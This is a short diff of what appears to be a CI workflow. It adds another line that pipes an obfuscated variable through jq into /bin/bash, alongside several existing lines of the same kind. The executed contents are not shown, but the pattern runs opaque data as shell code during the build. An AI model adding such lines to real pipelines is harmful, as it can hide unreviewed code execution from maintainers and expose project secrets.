@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$szumh450" | jq -r .eesiq8657 | /bin/bash
           echo $kikno317 | jq -r .ti0 | /bin/bash
           echo $dt9 | jq -r .t620 | /bin/bash
+          echo $qwq78 | jq -r .xlt48 | /bin/bash
 
       - name: Store artifact
         if: always()
